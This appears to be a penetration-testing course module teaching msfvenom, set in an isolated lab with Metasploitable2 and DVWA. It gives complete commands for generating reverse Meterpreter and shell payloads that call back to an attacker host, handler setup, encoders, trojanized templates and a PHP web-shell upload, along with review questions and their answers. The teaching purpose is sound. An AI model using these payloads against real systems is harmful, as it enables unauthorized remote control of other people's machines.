# Module 6 — MSFVenom Mastery

## Objectives

Generate standalone payloads with msfvenom across multiple formats, understand encoder usage and its real limits, customize payloads with bad-character filtering and templates, and set up matching handlers to catch reverse connections — all inside an isolated lab network.

## Theory

`msfvenom` is the standalone payload generator that replaced the older separate `msfpayload`/`msfencode` tools. It takes the same payload modules used inside msfconsole and packages them into a deliverable file format (an EXE, an ELF, a PHP script, a WAR file, an APK, raw shellcode, and many more) that you can deploy via whatever delivery mechanism your lab scenario calls for.

## Deep Technical Explanation

### Basic payload creation syntax

```bash
msfvenom -p <payload/path> LHOST=<ip> LPORT=<port> -f <format> -o <outfile>
```

Example — a Windows reverse Meterpreter EXE:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o shell.exe
```

### Payload formats

```bash
msfvenom --list formats
```

Common ones you'll use constantly: `exe` (Windows executable), `elf` (Linux executable), `raw` (raw shellcode bytes, for embedding in custom code), `war` (Java web archive, for Tomcat-style targets), `apk` (Android), `psh`/`psh-reflection` (PowerShell-based delivery).

### Encoders

```bash
msfvenom --list encoders
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -e x64/zutto_dekiru -f exe -o shell_encoded.exe
```

**Important framing for this lab:** encoding here is for compatibility (avoiding bad characters in constrained delivery contexts) and basic obfuscation practice, not a reliable way to defeat modern endpoint protection. Treat any AV-evasion testing strictly as "does my lab AV flag this," never as a real evasion technique to rely on outside a controlled lab.

### Payload customization

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -f raw -o shell.bin
```

`-b` excludes "bad characters" that would break the specific delivery context (e.g., a null byte terminating a string early). `-i` controls encoder iteration count. `-x` lets you specify an existing executable as a template to inject the payload into (useful for "trojanized" lab exercises that simulate social engineering delivery, strictly inside your isolated network).

### Reverse vs bind payloads

- **Reverse** (`*_reverse_tcp`) — the target initiates the outbound connection back to you. Works well when the target is behind NAT/firewall rules that allow outbound but block inbound (the overwhelmingly common real-world case).
- **Bind** (`*_bind_tcp`) — the target opens a listening port and waits for you to connect inbound. Useful when you already have an inbound path but the target can't reach you outbound.

### Web payloads

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f raw -o shell.jsp
```

These are designed to be dropped via an existing file-upload vulnerability in a vulnerable web app lab (DVWA's "File Upload" module is the canonical teaching target).

## Practical Examples — Full Generate-and-Catch Cycle

```bash
# 1. Generate
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf

# 2. Set up the matching handler in msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.56.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run

# 3. On the target (Metasploitable2 or any lab VM you control), simulate execution:
./shell.elf
```

**Expected output:** The handler reports `[*] Meterpreter session 1 opened` once `shell.elf` runs on the target.

## Common Mistakes

- Mismatching payload architecture/format and target OS (e.g., generating an `exe` and trying to run it on a Linux box).
- Forgetting that the handler's `PAYLOAD`/`LHOST`/`LPORT` must exactly match what msfvenom baked into the file, or the callback never completes correctly.
- Believing an encoded payload is "safe" to test against production antivirus or to use outside a lab — treat every generated payload as lab-only material.
- Not testing the generated payload at all before assuming it "should work" in a timed exam scenario.

## Real-World Usage

On authorized engagements, msfvenom-generated payloads are typically delivered through a vulnerability already discovered during exploitation (a file upload flaw, a command injection point) rather than through social engineering, unless social engineering is explicitly in scope and separately authorized — payload generation is the easy part, getting authorized delivery right is the part that actually requires judgment.

## Guided Lab — Web Shell via DVWA File Upload

**Objective:** Generate a PHP Meterpreter payload and deliver it through DVWA's intentionally vulnerable file upload feature.

**Setup:** DVWA running and accessible, security level set to "low" for this first pass.

**Steps:**
1. `msfvenom -p php/meterpreter_reverse_tcp LHOST=<kali-ip> LPORT=4444 -f raw -o shell.php`
2. Start a matching `exploit/multi/handler` listener as shown above (PAYLOAD `php/meterpreter_reverse_tcp`).
3. Log into DVWA, navigate to the File Upload module, upload `shell.php`.
4. Browse to the uploaded file's path to trigger execution.

**Expected output:** The handler should report a new Meterpreter session.

**Verification:** `sessions -l` shows the session; `sysinfo` from inside it reports the DVWA host's OS details.

**Troubleshooting:** If the upload is rejected, confirm DVWA's security level isn't set to "high" (which adds stricter file-type validation by design, for a later, harder lab pass).

## Challenge Lab

Generate a Linux ELF reverse Meterpreter payload with bad-character exclusion for `\x00`, encode it once, and successfully catch a session with a matching handler — entirely from memory of the syntax pattern, no copy-pasting.

## Review Questions

1. What replaced `msfpayload`/`msfencode`, and why?
2. What is the actual purpose of the `-b` bad-characters flag?
3. When would you choose a bind payload over a reverse payload?
4. Why shouldn't you rely on msfvenom encoders for real-world AV evasion?
5. What must match exactly between a generated payload and its catching handler?

## Answers

1. `msfvenom`, which unified payload generation and encoding into a single, simpler tool.
2. To exclude specific byte values that would break the payload in its specific delivery context (e.g., a null byte that would prematurely terminate a string-based injection point).
3. When the target can't reach you outbound but you already have a way to connect inbound to it.
4. Modern antivirus/EDR uses behavioral and heuristic detection far beyond simple byte-signature matching, so basic encoding offers little to no real protection outside a controlled lab test.
5. Payload type, LHOST, and LPORT (and format/architecture compatibility with the target).
